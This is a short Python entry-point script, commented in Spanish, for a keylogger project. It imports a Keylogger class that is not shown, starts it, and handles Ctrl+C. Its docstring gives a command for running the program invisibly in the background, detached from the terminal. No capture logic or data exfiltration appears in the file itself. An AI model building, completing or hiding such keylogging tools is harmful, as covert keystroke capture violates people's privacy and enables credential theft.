# !/usr/bin/env python3
"""
Fichero main del proyecto keylogger

Ejecución invisible: 
    python3 main.py &> /dev/null & disown
"""

import signal
import sys
from keylogger import Keylogger
from termcolor import colored


def def_handler(sig, frame):
    """
    Manejador de señales de salida Ctrl+C
    """

    print(colored('\n[!] Saliendo...\n', 'red', attrs=['bold']))

    my_keylogger.shutdown()
    sys.exit(1)


signal.signal(signal.SIGINT, def_handler)

if __name__ == '__main__':

    my_keylogger = Keylogger()

    my_keylogger.start()
